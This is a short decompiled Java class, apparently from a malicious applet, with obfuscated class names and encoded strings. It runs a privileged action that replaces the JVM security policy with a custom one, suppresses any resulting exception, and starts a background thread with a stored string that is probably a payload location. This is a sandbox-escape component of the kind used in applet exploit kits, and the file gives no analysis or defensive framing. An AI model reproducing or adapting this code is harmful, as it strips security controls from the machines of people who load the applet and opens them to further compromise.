import java.security.Policy;
import java.security.PrivilegedAction;

// 
// Decompiled by Procyon v0.5.30
// 

public class Applet99 implements PrivilegedAction
{
    String __X;
    int port;
    
    @Override
    public Object run() {
        try {
            Policy.setPolicy(new Applet3db752());
        }
        catch (SecurityException ex) {}
        new Thread(new Applet16e799(this.__X)).start();
        return main.Applet6e(".\u0018") + main.Applet6e(" \u0019");
    }
    
    public Applet99(final String _x, final int port) {
        this.__X = _x;
        this.port = port;
    }
}
